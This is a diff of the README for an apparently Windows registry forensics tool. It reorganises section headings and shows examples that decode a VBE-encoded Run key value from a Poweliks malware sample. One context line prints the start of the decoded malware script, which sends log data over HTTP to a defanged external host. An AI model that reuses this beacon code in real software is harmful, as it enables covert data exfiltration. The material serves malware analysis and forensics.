@@ -12,6 +12,9 @@
     - [Key information](#key-info)
     - [Query keys (Recursively)](#query-keys-r)
     - [Query values](#query-values)
+    - [Registry Handlers](#registry-handlers)
+    - [Plugins](#plugins)
+    - [Baseline/Whitelist](#baseline)
     
 ## Introduction: <a name="introduction"></a>
 
@@ -257,7 +260,7 @@ Result:
 --> -qkw: allows for wildcard querying, so i was able to make \Run\* to indicate to scan the \Run and its subkeys
 </pre>
 
-### Query Value: <a name="query-values"></a>
+### Query Values: <a name="query-values"></a>
 
 Let's say you want to query default registry value in the Run key, and get its value_name and value_content only.
 <pre>
@@ -268,7 +271,7 @@ Result:
 {'value_name': '(default)', 'value_content': '#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@'}
 </pre>
 
-####How to use Registry Handlers:
+### Registry Handlers: <a name="registry-handlers"></a>
 Let's say you want to query the same value, and try to decode the value_content as it seems to be VBE encoding.
 <pre>
 -s "examples/poweliks.dat" -rh "decode_vbe" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
@@ -321,7 +324,7 @@ cat /tmp/script.vbe | head -c 120
 function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
 </pre>
 
-#### Executing Plugins:
+### Plugins: <a name="plugins></a>:
 
 <pre>
 -s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
@@ -333,7 +336,7 @@ Following command would execute all specified plugins against all loaded hives:
 </pre>
 
 
-**Baseline:**
+### Baseline: <a name="baseline></a>:
 
 It's still in beta version (a feature from regparser, with low attention rate, but i still think that it's usefull)
 
